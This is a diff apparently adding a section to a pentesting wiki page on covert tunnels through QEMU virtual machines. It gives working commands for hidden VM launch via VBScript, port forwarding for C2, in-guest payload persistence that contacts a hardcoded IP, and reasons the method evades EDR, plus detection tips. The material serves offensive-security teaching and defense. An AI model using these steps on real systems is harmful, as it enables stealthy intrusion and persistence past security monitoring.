@@ -726,10 +726,72 @@ ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_p
 
 The above command publishes the victim’s port **8080** as **attacker_ip:9000** without deploying any additional tooling – ideal for living-off-the-land pivoting. 
 
+## Covert VM-based Tunnels with QEMU
+
+QEMU’s user-mode networking (`-netdev user`) supports an option called `hostfwd` that **binds a TCP/UDP port on the *host* and forwards it into the *guest***.  When the guest runs a full SSH daemon, the hostfwd rule gives you a disposable SSH jump box that lives entirely inside an ephemeral VM – perfect for hiding C2 traffic from EDR because all malicious activity and files stay in the virtual disk.
+
+### Quick one-liner
+
+```powershell
+# Windows victim (no admin rights, no driver install – portable binaries only)
+qemu-system-x86_64.exe ^
+   -m 256M ^
+   -drive file=tc.qcow2,if=ide ^
+   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
+   -device e1000,netdev=n0 ^
+   -nographic
+```
+
+• The command above launches a **Tiny Core Linux** image (`tc.qcow2`) in RAM.  
+• Port **2222/tcp** on the Windows host is transparently forwarded to **22/tcp** inside the guest.  
+• From the attacker’s point of view the target simply exposes port 2222; any packets that reach it are handled by the SSH server running in the VM.
+
+### Launching stealthily through VBScript
+
+```vb
+' update.vbs – lived in C:\ProgramData\update
+Set o = CreateObject("Wscript.Shell")
+o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
+```
+
+Running the script with `cscript.exe //B update.vbs` keeps the window hidden.
+
+### In-guest persistence
+
+Because Tiny Core is stateless, attackers usually:
+
+1. Drop payload to `/opt/123.out`  
+2. Append to `/opt/bootlocal.sh`:
+
+   ```sh
+   while ! ping -c1 45.77.4.101; do sleep 2; done
+   /opt/123.out
+   ```
+
+3. Add `home/tc` and `opt` to `/opt/filetool.lst` so the payload is packed into `mydata.tgz` on shutdown.
+
+### Why this evades detection
+
+• Only two unsigned executables (`qemu-system-*.exe`) touch disk; no drivers or services are installed.  
+• Security products on the host see **benign loopback traffic** (the actual C2 terminates inside the VM).  
+• Memory scanners never analyse the malicious process space because it lives in a different OS.
+
+### Defender tips
+
+• Alert on **unexpected QEMU/VirtualBox/KVM binaries** in user-writable paths.  
+• Block outbound connections that originate from `qemu-system*.exe`.  
+• Hunt for rare listening ports (2222, 10022, …) binding immediately after a QEMU launch.
+
+---
+
 ## Other tools to check
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
+
+## References
+
+- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
 
 {{#include ../banners/hacktricks-training.md}}
 
